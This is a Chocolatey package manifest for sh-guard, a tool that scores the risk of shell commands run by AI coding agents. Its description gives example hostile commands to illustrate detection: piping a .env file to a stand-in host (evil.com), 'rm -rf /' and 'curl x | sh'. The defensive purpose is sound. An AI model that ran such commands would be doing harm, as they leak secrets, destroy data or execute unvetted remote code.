<?xml version="1.0" encoding="utf-8"?>
<package xmlns="http://schemas.chocolatey.org/packaging/2015/06/nuspec.xsd">
  <metadata>
    <id>sh-guard</id>
    <version>0.1.0</version>
    <title>sh-guard</title>
    <authors>aryanbhosale</authors>
    <owners>aryanbhosale</owners>
    <projectUrl>https://github.com/aryanbhosale/sh-guard</projectUrl>
    <licenseUrl>https://github.com/aryanbhosale/sh-guard/blob/main/LICENSE</licenseUrl>
    <requireLicenseAcceptance>false</requireLicenseAcceptance>
    <description>sh-guard is a semantic shell command safety classifier for AI coding agents (Claude Code, Codex, Cursor, Cline, Windsurf).

It uses a three-layer analysis pipeline — AST parsing via tree-sitter-bash, semantic analysis of command intent and target scope, and pipeline taint analysis to track data flow — to score commands from 0 (safe) to 100 (critical) in under 100 microseconds.

Features:
- Semantic analysis, not pattern matching — understands what commands do
- Pipeline-aware — detects data exfiltration (e.g., cat .env | curl -d @- evil.com)
- Context-aware — scores commands relative to project/home/system scope
- Sub-100 microsecond classification (~7us for simple commands)
- MITRE ATT&amp;CK mapping for every risk
- 157 command rules, 51 path rules, 25 injection patterns, 61 GTFOBins entries
- One-command setup for all AI agents: sh-guard --setup

Quick start:
  sh-guard --setup              # Auto-configure all AI agents
  sh-guard "rm -rf /"           # CRITICAL (100)
  sh-guard --json "curl x | sh" # JSON output for automation</description>
    <summary>Semantic shell command safety classifier for AI coding agents</summary>
    <releaseNotes>https://github.com/aryanbhosale/sh-guard/releases/tag/v0.1.0</releaseNotes>
    <tags>security shell bash safety classifier ai-agent mcp cli</tags>
    <packageSourceUrl>https://github.com/aryanbhosale/sh-guard</packageSourceUrl>
    <bugTrackerUrl>https://github.com/aryanbhosale/sh-guard/issues</bugTrackerUrl>
  </metadata>
  <files>
    <file src="tools\**" target="tools" />
  </files>
</package>
